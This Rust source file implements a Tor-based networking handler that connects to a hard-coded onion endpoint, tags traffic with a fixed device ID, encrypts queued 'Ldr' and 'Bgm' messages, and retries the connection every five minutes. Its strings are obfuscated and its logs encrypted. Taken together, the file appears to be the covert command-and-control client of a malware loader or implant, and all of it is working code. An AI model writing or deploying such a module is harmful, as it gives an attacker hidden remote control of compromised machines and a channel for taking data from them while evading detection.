use std::{ collections::VecDeque, future::Future, path::PathBuf, sync::Arc, time::Duration };
use anyhow::{ Context, Result };
use arti_client::{ DataStream, StreamPrefs, TorClient, TorClientConfig };
use obfstr::obfstr as s;
use crate::{
    ref_err,
    ref_info,
    ref_tag,
    utils::{ encryption::sauron_encrypt, functions::fetch_constant_device_id },
};
use crate::{
    constants::{ communication_encryption_key, onion_endpoint },
    logs::logger::Logger,
    utils::encryption::{ convert_key_to_bytes, sauron_decrypt },
};
use tokio::{ io::{ AsyncReadExt, AsyncWriteExt }, sync::{ Mutex, RwLock }, time::interval };
use serde::{ Deserialize, Serialize };
use crate::ref_log_internal;

pub type RwPtr<T> = Arc<RwLock<T>>;
pub type MutexPtr<T> = Arc<Mutex<T>>;

pub type SendQueue = VecDeque<Vec<u8>>;

#[derive(Clone)]
pub struct TrHandler {
    pub logger: MutexPtr<Option<Logger>>,
    pub dv_id: RwPtr<String>,
    tr_clnt: MutexPtr<TorClient<tor_rtcompat::PreferredRuntime>>,
    stream_prefs: RwPtr<StreamPrefs>,
    stream: MutexPtr<Option<DataStream>>,
    send_queue: MutexPtr<SendQueue>,
    pub queue_tick_interval_ms: RwPtr<u64>,
    tcp_receive_poll_delay_ms: RwPtr<u64>,
    retry_connect_interval_ms: RwPtr<u64>,
    retry_read_stream_interval_ms: RwPtr<u64>,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct ServerReceive {
    pub server_receive_type: SrvRcvTp,
    pub data: Vec<u8>,
}
#[derive(Serialize, Deserialize, Debug, Clone)]
pub enum SrvRcvTp {
    Ldr,
    Bgm,
}
pub enum LoggerCnfg {
    Existing(Option<Logger>),
    New {
        log_dir: PathBuf,
        log_enc_key: String,
    },
}
impl TrHandler {
    pub async fn new(logger_config: LoggerCnfg) -> Result<Self> {
        let config = TorClientConfig::default();
        let tor_client = TorClient::create_bootstrapped(config).await.context(
            s!("Failed to create Tor client").to_string()
        )?;
        let mut stream_prefs: StreamPrefs = StreamPrefs::default();
        let logger = match logger_config {
            LoggerCnfg::Existing(logger) => logger,
            LoggerCnfg::New { log_dir: log_directory, log_enc_key: log_encryption_key } =>
                Some(Logger::new(log_directory, log_encryption_key)?),
        };
        if let Some(lg) = &logger {
            ref_tag!(lg, "TOR-HANDLER");
        }
        stream_prefs.connect_to_onion_services(arti_client::config::BoolOrAuto::Explicit(true));

        let tor_handler = TrHandler {
            stream: Arc::new(Mutex::new(None)),
            dv_id: Arc::new(RwLock::new(fetch_constant_device_id())),
            send_queue: Arc::new(Mutex::new(VecDeque::new())),
            logger: Arc::new(Mutex::new(logger)),
            tr_clnt: Arc::new(Mutex::new(tor_client)),
            stream_prefs: Arc::new(RwLock::new(stream_prefs)),
            tcp_receive_poll_delay_ms: Arc::new(RwLock::new(100)),
            retry_connect_interval_ms: Arc::new(RwLock::new(5 * 60 * 1000)), // 5 minutes
            retry_read_stream_interval_ms: Arc::new(RwLock::new(100)),
            queue_tick_interval_ms: Arc::new(RwLock::new(10)),
        };

        Ok(tor_handler)
    }
    pub async fn connect_to_endpoint(&mut self) -> Result<()> {
        let tor_client = self.tr_clnt.lock().await;
        let stream_prefs = self.stream_prefs.read().await;
        let stream = tor_client
            .connect_with_prefs((onion_endpoint(), 80), &stream_prefs).await
            .context(s!("Failed to connect to onion endpoint").to_string())?;
        let mut stream_guard = self.stream.lock().await;
        *stream_guard = Some(stream);

        Ok(())
    }
    pub async fn run<ReceiveCallbackFunc, ConnectCallbackFunc, ParentType>(
        &mut self,
        parent_self_ref: Arc<RwLock<ParentType>>,
        receive_callback: ReceiveCallbackFunc,
        connect_callback: ConnectCallbackFunc
    )
        where
            ReceiveCallbackFunc: Fn(Arc<RwLock<ParentType>>, Vec<u8>) +
                Send +
                Sync +
                Clone +
                'static,
            ConnectCallbackFunc: Fn(Arc<RwLock<ParentType>>) + Send + Sync + Clone + 'static
    {
        // CC: FnMut() + Send + Sync + Clone + 'static,
        let self_clone = self.clone();
        ref_info!(
            self.logger.lock().await.as_ref().expect("no logger"),
            "SPAWNING SEND QUEUE TASK"
        );
        tokio::task::spawn(async move { self_clone.send_queue_task().await });
        ref_info!(self.logger.lock().await.as_ref().expect("no logger"), "SPAWNED");
        loop {
            ref_info!(
                self.logger.lock().await.as_ref().expect("no logger"),
                "RUNNING self.connect_to_endpoint()"
            );
            match self.connect_to_endpoint().await {
                Ok(()) => {
                    // should send connect callback
                    connect_callback(parent_self_ref.clone());
                    ref_info!(
                        self.logger.lock().await.as_ref().expect("no logger"),
                        " connect_callback.clone()(); DONE"
                    );

                    loop {
                        if
                            let Err(_error) = self.handle_receive(
                                parent_self_ref.clone(),
                                receive_callback.clone()
                            ).await
                        {
                            // ref_err!(
                            //     self.logger.lock().unwrap(),
                            //     "Failed to handle_receive: ",
                            //     error
                            // );
                            ref_info!(
                                self.logger.lock().await.as_ref().expect("no logger"),
                                "if let Err(_error) = self.handle_receive(receive_callback.clone()).await {"
                            );
                            // so we will try reconnect to endpoint again after interval
                            break;
                        }
                        tokio::time::sleep(
                            Duration::from_millis(
                                self.retry_read_stream_interval_ms.read().await.to_owned()
                            )
                        ).await;
                    }
                }
                Err(_error) => {
                    // ref_err!(self.logger.lock().unwrap(), "Failed to connect_to_endpoint");
                    ref_err!(
                        self.logger.lock().await.as_ref().expect("no logger"),
                        "Failed to connect_to_endpoint, timeouting retry"
                    );
                }
            }
            ref_info!(
                self.logger.lock().await.as_ref().expect("no logger"),
                "STARTING RETRY CONNECT SLEEP"
            );
            tokio::time::sleep(
                Duration::from_millis(self.retry_connect_interval_ms.read().await.to_owned())
            ).await;
        }
    }
    async fn handle_receive<RC, CT>(
        &self,
        parent_self_ref: Arc<RwLock<CT>>,
        callback: RC
    ) -> Result<()>
        where RC: Fn(Arc<RwLock<CT>>, Vec<u8>) + Send + Sync + Clone + 'static
    {
        loop {
            let data = self
                .read_data().await
                .context(s!("Failed to read_data from stream").to_string())?;

            let parent_clone = parent_self_ref.clone();

            callback(parent_clone.clone(), data);

            tokio::time::sleep(
                Duration::from_millis(self.tcp_receive_poll_delay_ms.read().await.to_owned())
            ).await;
        }
    }

    async fn read_data(&self) -> Result<Vec<u8>> {
        let read_stream_ref = self.get_stream().await?;

        let mut shell_guard = read_stream_ref.lock().await;
        let stream = shell_guard.as_mut().unwrap();

        stream.wait_for_connection().await?;

        let data_length = match stream.read_u32_le().await {
            Ok(length) => length,
            Err(_error) => {
                // means not our protocol message
                // assume its conn close
                return Err(anyhow::anyhow!(s!("?Connection closed by server?").to_owned()));
            }
        };

        let mut data_buf = vec![0; data_length as usize];
        stream
            .read_exact(&mut data_buf).await
            .context(s!("Failed to read exact data from stream").to_string())?;
        Ok(data_buf)
    }

    async fn send_queue_task(&self) -> ! {
        let mut interval = interval(
            Duration::from_millis(self.queue_tick_interval_ms.read().await.to_owned())
        );
        loop {
            interval.tick().await;
            let mut queue = self.send_queue.lock().await;
            while let Some(data) = queue.pop_front() {
                ref_info!(
                    self.logger.lock().await.as_ref().expect("no logger"),
                    "QUEUE RECEIVED SENDING"
                );

                if let Err(error) = self.encrypt_and_send(&data).await {
                    // ref_err!(self.logger.lock().unwrap(), "Failed to encrypt_and_send");
                    ref_err!(
                        self.logger.lock().await.as_ref().expect("no logger"),
                        "Failed to encrypt_and_send: ",
                        error
                    );
                }
            }
        }
    }
    pub async fn add_to_send_queue(
        &self,
        server_receive_type: SrvRcvTp,
        data: Vec<u8>
    ) -> Result<()> {
        let send = ServerReceive { server_receive_type, data };
        let binary_data = serde_json
            ::to_vec(&send)
            .context(s!("Failed to serialize ServerReceive struct to binary data").to_string())?;
        self.send_queue.lock().await.push_back(binary_data);
        ref_info!(
            self.logger.lock().await.as_ref().expect("no logger"),
            "added data to sent queue"
        );
        Ok(())
    }
    async fn encrypt_and_send(&self, data: &[u8]) -> Result<()> {
        let encrypted_data = sauron_encrypt(
            convert_key_to_bytes(&communication_encryption_key()),
            data
        )?;
        self.send_data(&encrypted_data).await
    }
    async fn send_data(&self, data: &[u8]) -> Result<()> {
        let read_stream_ref = self.get_stream().await?;
        let mut shell_guard = read_stream_ref.lock().await;
        let stream = shell_guard.as_mut().unwrap();
        stream.write_all(data).await.context(s!("Failed to write to stream").to_string())?;
        stream.flush().await.context(s!("Failed to flush stream").to_string())?;
        Ok(())
    }
    async fn get_stream(&self) -> Result<MutexPtr<Option<DataStream>>> {
        if self.stream.lock().await.is_some() {
            Ok(self.stream.clone())
        } else {
            Err(anyhow::anyhow!(s!("Data Stream not initialized").to_string()))
        }
    }
}
